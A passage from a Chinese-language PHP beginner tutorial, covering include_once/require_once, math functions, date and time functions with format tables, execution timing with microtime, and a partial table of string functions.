<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//user.php</span><br><span class="line"></span><br><span class="line">//这儿被包含了两次同样的函数定义文件哟</span><br><span class="line">include_once <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line">include_once <span class="string">&#x27;functions.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">//可以直接调用</span><br><span class="line">demo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行后系统不会报错！！！</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>我们在函数定义章节讲过，函数不能定义两次，否则会报错。<font color="#FF7F00"><strong>使用include时</strong></font>，因为我们将 functions.php包含了两次所以执行了两次，<font color="#FF7F00"><strong>因此报这个错误</strong></font>。<br>而<font color="#FF7F00"><strong>include_once不报错</strong></font>的原因是因为：他检测了functions.php曾经包含过，不再进行包含引入了。</p>
</blockquote>
<p><font face="Comic sans MS">而<strong>require</strong>和<strong>require_once</strong>的功能，大家用你最最聪明的小脑袋是不是就能推理出来了呢？require_once有两个特点：</p>
<ol>
<li>包含的文件必须存在，否则停止执行</li>
<li>会做重复包含检查哟</font>


</li>
</ol>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-3-数学常用函数"><a href="#2-3-数学常用函数" class="headerlink" title="2.3  数学常用函数"></a><font color="#3CB371" face="Comic sans MS">2.3  数学常用函数</font></h4><p>在PHP程序中常常需要进行数据处理运算，这就需要使用数学函数。<font color="#00B2EE"><strong>数学函数是最简单、最常用的系统函数</strong></font>。本章以数学函数为例讲解系统函数的调用方法。</p>
<p>只需要记最常用的一些即可，最常用的列表：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="center">描述</th>
<th align="left">实例</th>
<th align="left">输入</th>
<th align="left">输出</th>
</tr>
</thead>
<tbody><tr>
<td align="center">abs()</td>
<td align="center">求绝对值</td>
<td align="left">$abs = abs(-4.2); //4.2</td>
<td align="left">数字</td>
<td align="left">绝对值数字</td>
</tr>
<tr>
<td align="center">ceil()</td>
<td align="center">进一法取整</td>
<td align="left">echo ceil(9.999); // 10</td>
<td align="left">浮点数</td>
<td align="left">进一取整</td>
</tr>
<tr>
<td align="center">floor()</td>
<td align="center">舍去法取整</td>
<td align="left">echo floor(9.999); // 9</td>
<td align="left">浮点数</td>
<td align="left">直接舍去小数部分</td>
</tr>
<tr>
<td align="center">fmod()</td>
<td align="center">浮点数取余</td>
<td align="left">“$x = 5.7;$y = 1.3;<br>$r = fmod($x, $y);<br>// $r equals 0.5, <br>because 4 *  1.3 + 0.5 = 5.7”</td>
<td align="left">两个浮点数,x&gt;y</td>
<td align="left">浮点余数</td>
</tr>
<tr>
<td align="center">pow()</td>
<td align="center">返回数的n次方</td>
<td align="left">echo pow(-1, 20); // 1</td>
<td align="left">基础数n次方</td>
<td align="left">乘方值</td>
</tr>
<tr>
<td align="center">round()</td>
<td align="center">浮点数四舍五入</td>
<td align="left">echo round(1.95583, 2);// 1.96</td>
<td align="left">一个数值</td>
<td align="left">保留小数点后多少位,默认为0,舍入后的结果</td>
</tr>
<tr>
<td align="center">sqrt()</td>
<td align="center">求平方根</td>
<td align="left">echo sqrt(9); //3</td>
<td align="left">被开方的数</td>
<td align="left">平方根</td>
</tr>
<tr>
<td align="center">max()</td>
<td align="center">求最大值</td>
<td align="left">“echo max(1, 3, 5, 6, 7);  <br>// 7 echo max(array(2, 4, 5)); <br>// 5”</td>
<td align="left">多个数字或数组</td>
<td align="left">返回其中的最大值</td>
</tr>
<tr>
<td align="center">min()</td>
<td align="center">求最小值</td>
<td align="left">min</td>
<td align="left">多个数字或数组</td>
<td align="left">返回其中的最小值</td>
</tr>
<tr>
<td align="center">mt_rand()</td>
<td align="center">更好的随机数</td>
<td align="left">echo mt_rand(0,9);//n</td>
<td align="left">最小/最大,随机数</td>
<td align="left">随机返回范围内的值</td>
</tr>
<tr>
<td align="center">rand()</td>
<td align="center">随机数</td>
<td align="left">echo rand()</td>
<td align="left">最小/最大,随机数</td>
<td align="left">随机返回范围内的值</td>
</tr>
<tr>
<td align="center">pi()</td>
<td align="center">获取圆周率值</td>
<td align="left">echo pi(); <br>// 3.1415926535898</td>
<td align="left">无</td>
<td align="left">获取圆周率</td>
</tr>
</tbody></table>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-4-获取时期时间信息函数"><a href="#2-4-获取时期时间信息函数" class="headerlink" title="2.4  获取时期时间信息函数"></a><font color="#3CB371" face="Comic sans MS">2.4  获取时期时间信息函数</font></h4><p><font face="Comic sans MS">在正式学习日期函数前大家得了解几个概念：<br><font color="#00B2EE"><strong>1. 时区</strong><br><strong>2. 世界时</strong><br><strong>3 .unix时间戳</strong></font><br></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>时区</strong></font><br>这个概念，之前大家听说过很多。我们来啰嗦两句，我们现实生活中使用的实区，在电脑里面也是一样有规定的。<br>1884年在华盛顿召开国际经度会议时，为了克服时间上的混乱，规定将全球划分为24个时区。<br>在中国采用首都北京所在地东八区的时间为全国统一使用时间。</p>
</blockquote>
<blockquote>
<p><font color="#FF7F00"><strong>世界时</strong></font><br>不光是天文学家使用格林尼治时间（英文简写:GMT），就是在新闻报刊上也经常出现这个名词。我们知道各地都有各地的地方时间。如果对国际上某一重大事情，用地方时间来记录，就会感到复杂不便．而且将来日子一长容易搞错。因此，天文学家就提出一个大家都能接受且又方便的记录方法，那就是以格林尼治（英国某地区）的地方时间为标准。</p>
</blockquote>
<blockquote>
<p><font color="#FF7F00"><strong>unix时间戳</strong></font><br>电脑本身不认识时间，我们在电脑里面设置一个时间方便运算。于是我们规定了一种计算方式，unix时间戳。<br>从Unix纪元（1970 年 1月1日零时）开始到一个时间经过的秒数。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>1. 设置时区</strong></font><br>如果，我们是跨国的多语方程序，我们通常是通过在配置文件里面来写好了个时区，每次程序运行的时候。都会读取这个时区的设置，来显示时间。</p>
<p>设置时区的函数为：<br>1). <font color="red" ><strong>date_default_timezone_get()</strong></font><br>2). <font color="red" ><strong>date_default_timezone_set()</strong></font><br></font></p>
<p>&emsp;<br><font color="#FF6347">(1)↓↓</font><br>第一个函数就不重点讲解了，比较简单。<br>用法如下：<br><font color="#00B2EE" ><strong>string date_default_timezone_get ( void )</strong></font><br>功能如下：<strong>取得一个脚本中所有日期时间函数所使用的默认时区</strong><br>示例：<br><font color="#00B2EE"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> date_default_timezone_get ();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出:UTC</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="#FF6347">(2)↓↓</font><br>第二个函数是重点：<br>用法如下：<br><font color="#00B2EE" ><strong>bool date_default_timezone_set ( string $timezone_identifier )</strong></font><br>功能如下：<strong>用于所有日期时间函数的默认时区</strong><font color="#00B2EE" >&emsp;[注：<a href="http://php.net/manual/zh/timezones.php">时区列表请详见官方手册</a>]</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//定义一下时区常量，以后你可以放到配置文件里</span><br><span class="line">define(<span class="string">&#x27;TIME_ZONE&#x27;</span>,<span class="string">&#x27;Asia/shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line">//执行函数</span><br><span class="line">date_default_timezone_set(TIME_ZONE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：2019-02-17 13:03:42</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>2. time()获取当前的unix时间戳</strong></font><br>以下代码输出当前时间的Unix时间戳。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   <span class="variable">$time</span>=time();</span><br><span class="line">   print_r( <span class="variable">$time</span>);</span><br><span class="line">?&gt;</span><br><span class="line">程序运行结果：</span><br><span class="line">1421597858</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>3. “亚麻跌”是PHP学习时间处理的关键</strong></font><br><font color="red" ><strong>Y</strong></font> &emsp;英文是 year， 为年份   代表年 ——亚<br><font color="red" ><strong>m</strong></font> &emsp;英文代表month，为月份  代表月 ——麻<br><font color="red" ><strong>d</strong></font> &emsp;英文代表day， 为日期   代表日 ——跌<br><font color="red" ><strong>H:i:s</strong></font> &emsp;代表的是：时分秒<br><font color="red" ><strong>h</strong></font> &emsp;的英文为：hour 代表小时<br><font color="red" ><strong>i</strong></font>&emsp; 的英文为：minute 代表分钟<br><font color="red" ><strong>s</strong></font>&emsp; 的英文为：second 代表秒<br></font></p>
<p>所以我们需要输出前前的年份，月份，日期的话。例如：1997年7月1日，我们就可以用到上面的三个参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y年m月d日&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">2019年02月17日</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>写全了就是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//就可以显示出来当前的时间了哟。</span><br><span class="line"><span class="built_in">echo</span> date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red" ><strong>date函数</strong></font>用于将一个时间进行格式化输出，以方便时间的显示或存储。其语法格式如下：<br><font color="#00B2EE" ><strong>string date ( string $forrnat [, int $timestamp] )</strong></font><br>在参数列表中:<br>$timestamp是一个时间戳，函数将这个时间戳按$format规定的格式输出。<br>如果$timestamp没有输入值，则默认为当前的时间。<br>$format是一个时间输出格式的字符串，需要使用规定的字符构造输出格式。<br></font></p>
<p>&emsp;<br><font color="#FF7F00"><strong>date函数的格式参数表：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="left">说明</th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">d</td>
<td align="left">月份中的第几天，有前导零的2位数字</td>
<td align="left">01到31</td>
</tr>
<tr>
<td align="center">D</td>
<td align="left">英文星期几，3个字母</td>
<td align="left">Mon到Sun</td>
</tr>
<tr>
<td align="center">j</td>
<td align="left">月份中的第几天，没有前导零</td>
<td align="left">1到31</td>
</tr>
<tr>
<td align="center">l(字母)</td>
<td align="left">英文星期几</td>
<td align="left">Sunday到 Saturday</td>
</tr>
<tr>
<td align="center">N</td>
<td align="left">1格式数字表示的星期</td>
<td align="left">1（表示星期一）到7（表示星期天)</td>
</tr>
<tr>
<td align="center">S</td>
<td align="left">每月天数后面的英文后缀，2个字符</td>
<td align="left">st，nd，rd或者th。可以和jg一起用</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">星期中的第几天，数字表示</td>
<td align="left">0（表示星期天）到 6（表示星期六）</td>
</tr>
<tr>
<td align="center">z</td>
<td align="left">一年中的第几天</td>
<td align="left">0到366</td>
</tr>
<tr>
<td align="center">W</td>
<td align="left">年份中的第几周，每周从星期一开始</td>
<td align="left">42（当年的第42周）</td>
</tr>
<tr>
<td align="center">F</td>
<td align="left">月份，完整的文本格式</td>
<td align="left">January 到 December</td>
</tr>
<tr>
<td align="center">m</td>
<td align="left">数字表示月份，有前导零</td>
<td align="left">01 到 12</td>
</tr>
<tr>
<td align="center">M</td>
<td align="left">3个字母缩写表示的月份</td>
<td align="left">Jan 到Dec</td>
</tr>
<tr>
<td align="center">n</td>
<td align="left">数字表示月份，没有前导零</td>
<td align="left">1 到 12</td>
</tr>
<tr>
<td align="center">t</td>
<td align="left">给定月份所应有的天数</td>
<td align="left">28 到 31</td>
</tr>
<tr>
<td align="center">L</td>
<td align="left">是否为闰年</td>
<td align="left">如果是闰年为1，否则为o</td>
</tr>
<tr>
<td align="center">o</td>
<td align="left">格式年份数字</td>
<td align="left">例如2007</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="left">4 位数字完整表示年份</td>
<td align="left">例如1999或2008</td>
</tr>
<tr>
<td align="center">y</td>
<td align="left">2 位数字表示的年份</td>
<td align="left">例如99或08</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">小写的上午和下午值</td>
<td align="left">am或pm</td>
</tr>
<tr>
<td align="center">A</td>
<td align="left">大写的上午和下午值</td>
<td align="left">AM或PM</td>
</tr>
<tr>
<td align="center">g</td>
<td align="left">小时，12小时格式，没有前导零</td>
<td align="left">1到12</td>
</tr>
<tr>
<td align="center">G</td>
<td align="left">小时，24小时格式，没有前导零</td>
<td align="left">0 到 23</td>
</tr>
<tr>
<td align="center">i</td>
<td align="left">有前导零的分钟数</td>
<td align="left">00 到 59</td>
</tr>
<tr>
<td align="center">s</td>
<td align="left">秒数，有前导零</td>
<td align="left">00到59</td>
</tr>
<tr>
<td align="center">e</td>
<td align="left">时区标识</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">U</td>
<td align="left">从Unix纪元开始至今的秒数</td>
<td align="left">长整型数字</td>
</tr>
</tbody></table>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>4. getdate获取当前系统时间</strong></font><br><font color="red" ><strong>getdate</strong></font>用来获取当前系统的时间，或者获得一个时间戳的具体含义。时间戳是一个长整数，表示getdate的语法格式如下所示。<br><font color="red" ><strong>array getdate ([ int $timestamp = time() ] )</strong></font><br>函数的返回值是一个根据timestamp得到的包含有时间信息的<strong>数组</strong>。如果没有参数，则会返回当前的时间。getdate返回的数组，键名包括时间和日期的完整信息。<br></font></p>
<table>
<thead>
<tr>
<th align="center">键名</th>
<th align="left">说明</th>
<th align="left">返回值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">secnods</td>
<td align="left">秒</td>
<td align="left">数字0到 59</td>
</tr>
<tr>
<td align="center">minutes</td>
<td align="left">分钟</td>
<td align="left">数字0到59</td>
</tr>
<tr>
<td align="center">hours</td>
<td align="left">小时</td>
<td align="left">数字 0到 23</td>
</tr>
<tr>
<td align="center">mday</td>
<td align="left">月份中第几天    数字</td>
<td align="left">1到 31</td>
</tr>
<tr>
<td align="center">wday</td>
<td align="left">星期中第几天    数字</td>
<td align="left">0（表示星期天）到6（表示星期六）</td>
</tr>
<tr>
<td align="center">mon</td>
<td align="left">月份</td>
<td align="left">数字 1 到 12</td>
</tr>
<tr>
<td align="center">year</td>
<td align="left">年</td>
<td align="left">4 位数字表示的完整年份</td>
</tr>
<tr>
<td align="center">yday</td>
<td align="left">一年中第几天    数字</td>
<td align="left">0到365</td>
</tr>
<tr>
<td align="center">weekday</td>
<td align="left">星期几的英文</td>
<td align="left">Sunday到 Saturday</td>
</tr>
<tr>
<td align="center">month</td>
<td align="left">月份的英文</td>
<td align="left">January 到 December</td>
</tr>
<tr>
<td align="center">0</td>
<td align="left">自从Unix纪元开始的秒数</td>
<td align="left">长整型数字</td>
</tr>
</tbody></table>
<p>&emsp;<br>以下代码可以返回getdate 数组的详细信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $mytime=getdate(); </span><br><span class="line">   print_r( $mytime);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><strong>print_r</strong>可以输出一个数组中所有的键名与值。运行这段代码，结果如下所示。程序输出当前计算机的时间与日期详细信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [seconds] =&gt; <span class="number">1</span>            <span class="comment">//秒</span></span><br><span class="line">    [minutes] =&gt; <span class="number">10</span>            <span class="comment">//分钟</span></span><br><span class="line">    [hours] =&gt; <span class="number">17</span>            <span class="comment">//小时</span></span><br><span class="line">    [mday] =&gt; <span class="number">18</span>            <span class="comment">//日</span></span><br><span class="line">    [wday] =&gt; <span class="number">0</span>            <span class="comment">//星期中的第几天</span></span><br><span class="line">    [mon] =&gt; <span class="number">1</span>            <span class="comment">//月</span></span><br><span class="line">    [year] =&gt; <span class="number">2015</span>            <span class="comment">//年</span></span><br><span class="line">    [yday] =&gt; <span class="number">17</span>            <span class="comment">//年中的第几天</span></span><br><span class="line">    [weekday] =&gt; Sunday        <span class="comment">//星期</span></span><br><span class="line">    [month] =&gt; January        <span class="comment">//月份</span></span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1421597401</span>        <span class="comment">//时间戳</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="#FF6347">↓↓</font>理解了getdate函数和返回的数组以后，就很容易取得当前的时间信息了。下面的代码就是用getdate函数取得时间信息，调用返回时间数组的值输出时间信息。<br><font color="#00B2EE" ></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$mytime</span> = getdate();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;年 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;year&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;月 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;mon&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;日 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;mday&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;时 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;hours&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;分 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;minutes&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;秒 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;seconds&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;一个小时中的第几钟 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;minutes&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;这是一分钟的第几秒 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;seconds&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;星期名称 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;weekday&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;月份名称 :&quot;</span>.<span class="variable">$mytime</span>[<span class="string">&#x27;month&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;时间戳   :&quot;</span>.<span class="variable">$mytime</span>[0].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">年 :2019 </span><br><span class="line">月 :2 </span><br><span class="line">日 :17 </span><br><span class="line">时 :5 </span><br><span class="line">分 :39 </span><br><span class="line">秒 :34 </span><br><span class="line">一个小时中的第几钟 :39 </span><br><span class="line">这是一分钟的第几秒 :34 </span><br><span class="line">星期名称 :Sunday </span><br><span class="line">月份名称 :February </span><br><span class="line">时间戳 :1550381974</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>5. 日期验证函数</strong></font><br><font color="red" ><strong>checkdate</strong></font>可以判断一个输出的日期是否有效。<br>在实际的工作中，我们需要经常用于检测常用于用户提交表单的数据验证。<br>例如：<strong>验证用户输入的时间是否正确</strong>。<br>函数的语法格式如下：<br><font color="red" ><strong>bool checkdate ( int $month , int $day , int $year )</strong></font><br></font><br>&emsp;<br><font color="red" ></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(checkdate(<span class="number">12</span>, <span class="number">31</span>, <span class="number">2018</span>));</span><br><span class="line">var_dump(checkdate(<span class="number">2</span>, <span class="number">29</span>, <span class="number">2011</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果：</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>


<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE" ><strong>6.获取本地化时间戳函数</strong></font> </font><br><strong>mktime()函数、strtotime()函数。</strong><br><font color="#00B2EE" >[注：<a href="http://www.php.cn/code/1116.html">使用方法</a>]</font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-5-检测程序执行时间"><a href="#2-5-检测程序执行时间" class="headerlink" title="2.5  检测程序执行时间"></a><font color="#3CB371" face="Comic sans MS">2.5  检测程序执行时间</font></h4><p><font face="Comic sans MS">我们有的时经常需要做程序的执行时间执行效率判断。</font><br>实现的思路如下：<br><font color="red" ></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//记录开始时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//记录结整时</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 开始时间  减去（-）  结束时间  得到程序的运行时间</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br><font face="Comic sans MS">可是不要忘了，程序的运行速度太快了。快到只有0.00000几秒的一刹那。那这个时候大家要记录一个特函的函数了：</font><br><font color="red" ><strong>mixed microtime ([ bool $get_as_float ] )</strong></font><br><strong>microtime()这个函数，能够返回当前 Unix 时间戳和微秒数。</strong><br><font color="red" ></font></p>
<blockquote>
<p><font color="#FF6347"><strong>参数：</strong><br>如果你传入true的话，将会返回一个浮点类型的时间，这样方便参与运算。</font></p>
</blockquote>
<p>模拟一个检测函数执行时间的例子，测试某个函数效率的快慢：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//开始时间</span><br><span class="line"><span class="variable">$time_start</span> = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">//循环一万次</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0 ; <span class="variable">$i</span> &lt; 10000 ; <span class="variable">$i</span>++)&#123;</span><br><span class="line">   //你可以用上，mktime() 生成一个昨天的时间</span><br><span class="line">   //再用strtotime() 生成一个昨天的时间</span><br><span class="line">   //对比两个函数认的效率高</span><br><span class="line">&#125;</span><br><span class="line">//结整时间</span><br><span class="line"><span class="variable">$time_end</span> = microtime(<span class="literal">true</span>);</span><br><span class="line">//相减得到运行时间</span><br><span class="line"><span class="variable">$time</span> = <span class="variable">$time_end</span> - <span class="variable">$time_start</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;这个脚本执行的时间为 <span class="variable">$time</span> seconds\n&quot;</span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">这个脚本执行的时间为 0.00016498565673828 seconds</span><br></pre></td></tr></table></figure>

<blockquote>
<p>最后输出的结果就是我们实际的函数的执行时间。你可以多对比几次，看看最终的结果。<br>谁的时间短，在实际的工作中，你就可以经常使用哪个函数。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-6-字符串常用函数"><a href="#2-6-字符串常用函数" class="headerlink" title="2.6  字符串常用函数"></a><font color="#3CB371" face="Comic sans MS">2.6  字符串常用函数</font></h4><p><font color="red"><strong>数组</strong></font>、<font color="red"><strong>字符串</strong></font>和<font color="red"><strong>数据库</strong></font>是我们函数里面最、最、最常用的三类函数。</p>
<p><font face="Comic sans MS">当然PHP的字符串函数也有很多。我们最常使用的两个系列的字符串：<br>    1.单字节字符串处理函数<br>    2.多字节字符串处理函数<br>    3.字符串编码转换函数<br></font></p>
<blockquote>
<p><font color="#FF6347"><strong>我们来说说为什么要学这么多函数：</strong></font><br>    1.我们学的是中文，是双字节或者三字节的。老外的函数只能处理英文和数字这些单字节的字符串处理不鸟中文。达不到我们的功能需求<br>    2.有的时候需要做不同字符编码间的转换，例如：把GBK的转为UTF-8<br>    3.英文这些字符在电脑里又是必须要处理的</p>
</blockquote>
<p>&emsp;</p>
<blockquote>
<p>中文主要用的是GBK和utf-8两种编码格式。<br>GBK和utf-8是两个不同的编码委员会对于汉字进行的编码的标准。<br>他们规定GBK是双字节，也就是一个汉字占用2Bytes。<br>utf-8是三字节，一个汉字占用三个字节长度的存储空间。</p>
</blockquote>
<p>&emsp;<br><font color="#00B2EE">PHP常用函数：</font></p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">trim()</td>
<td align="left">删除字符串两端的空格或其他预定义字符</td>
<td align="left">“$str = “\r\nHello World!\r\n”; echo trim($str);</td>
</tr>
<tr>
<td align="center">rtrim()</td>
<td align="left">删除字符串右边的空格或其他预定义字符</td>
<td align="left">“$str = “Hello World!\n\n”; echo rtrim($str);”</td>
</tr>
<tr>
<td align="center">chop()</td>
<td align="left">rtrim()的别名</td>
<td align="left">同上</td>
</tr>
<tr>
<td align="center">ltrim()</td>
<td align="left">删除字符串左边的空格或其他预定义字符</td>
<td align="left">“$str = “\r\nHello World!”; echo ltrim($str);”</td>
</tr>
<tr>
<td align="center">dirname()</td>
<td align="left">回路径中的目录部分（我们把它归在了字符串函数里了）</td>
<td align="left">echo dirname(“c:/testweb/home.php”);</td>
</tr>
<tr>
<td align="center">str_pad()</td>
<td align="left">把字符串填充为指定的长度</td>
<td align="left">$str = “Hello World”; echo str_pad($str,20,”.”);</td>
</tr>
<tr>
<td align="center">str_repeat()</td>
<td align="left">重复使用指定字符串</td>
<td align="left">echo str_repeat(“.”,13);</td>
</tr>
<tr>
<td align="center">str_split()</td>
<td align="left">把字符串分割到数组中</td>
<td align="left">print_r(str_split(“Hello”));</td>
</tr>
<tr>
<td align="center">strrev()</td>
<td align="left">反转字符串</td>
<td align="left">echo strrev(“Hello World!”);</td>
</tr>
<tr>
<td align="center">wordwrap()</td>
<td align="left">按照指定长度对字符串进行折行处理</td>
<td align="left">“$str = “”An example on a long word is: Supercalifragulistic””; echo wordwrap($str,15);”</td>
</tr>
<tr>
<td align="center">str_shuffle()</td>
<td align="left">随机地打乱字符串中所有字符</td>
<td align="left">echo str_shuffle(“Hello World”);</td>
</tr>
<tr>
<td align="center">parse_str()</td>
<td align="left">将字符串解析成变量</td>
<td align="left">“parse_str(“id=23&amp;name=John%20Adams”,$myArray); print_r($myArray);”</td>
</tr>
<tr>
<td align="center">number_format()</td>
<td align="left">通过千位分组来格式化数字</td>
<td align="left">“echo number_format(“1000000”); echo number_format(“1000000”,2); echo number_format(“1000000”,2,””,””,””.””);”</td>
</tr>
<tr>
<td align="center">strtolower()</td>
<td align="left">字符串转为小写</td>
<td align="left">echo strtolower(“Hello WORLD!”);</td>
</tr>
<tr>
<td align="center">strtoupper()</td>
<td align="left">字符串转为大写</td>
<td align="left">echo strtoupper(“Hello WORLD!”);</td>
</tr>
<tr>
<td align="center">ucfirst()</td>
<td align="left">字符串首字母大写</td>
<td align="left">echo ucfirst(“hello world”);</td>
</tr>
<tr>
<td align="center">ucwords()</td>
<td align="left">字符串每个单词首字符转为大写</td>
<td align="left">echo ucwords(“hello world”);</td>
</tr>
<tr>
<td align="center">htmlentities()</td>
<td align="left">把字符转为HTML实体</td>
<td align="left">$str = “”John &amp; ‘Adams’””; echo htmlentities($str, ENT_COMPAT);</td>
</tr>
<tr>
<td align="center">htmlspecialchars()</td>
<td align="left">预定义字符转html编码</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">nl2br()</td>
<td align="left">\n转义为标签</td>
<td align="left">echo nl2br(“One line.\nAnother line.”);</td>
</tr>
<tr>
<td align="center">strip_tags()</td>
<td align="left">剥去 HTML、XML 以及 PHP 的标签</td>
<td align="left">echo strip_tags(“Hello world!”);</td>
</tr>
<tr>
<td align="center">addcslashes()</td>
<td align="left">在指定的字符前添加反斜线转义字符串中字符</td>
<td align="left">$str = “”Hello, my name is John Adams.” echo $str; echo addcslashes($str,’m’);”</td>
</tr>
<tr>
<td align="center">stripcslashes()</td>
<td align="left">删除由addcslashes()添加的反斜线</td>
<td align="left">echo stripcslashes(“Hello, \my na\me is Kai Ji\m.”);</td>
</tr>
<tr>
<td align="center">addslashes()</td>
<td align="left">指定预定义字符前添加反斜线</td>
<td align="left">$str = “Who’s John Adams?”;echo addslashes($str);</td>
</tr>
<tr>
<td align="center">stripslashes()</td>
<td align="left">删除由addslashes()添加的转义字符</td>
<td align="left">echo stripslashes(“Who&#39;s John Adams?”);</td>
</tr>
<tr>
<td align="center">quotemeta()</td>
<td align="left">在字符串中某些预定义的字符前添加反斜线</td>
